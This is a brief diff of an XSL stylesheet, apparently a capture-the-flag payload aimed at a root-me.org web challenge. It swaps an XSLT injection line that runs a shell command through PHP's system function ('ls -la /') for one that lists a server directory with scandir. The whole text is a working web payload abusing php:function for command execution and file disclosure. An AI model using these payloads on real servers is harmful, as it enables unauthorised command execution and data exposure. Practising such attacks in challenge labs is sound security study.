@@ -15,5 +15,5 @@
 </xsl:for-each>
 </body>
   
-PHP test => <xsl:value-of select="php:function('system','ls -la /')"/>
+PHP test => <xsl:value-of select="php:function('scandir','http://challenge01.root-me.org/web-serveur/ch50/')"/>
 </html>
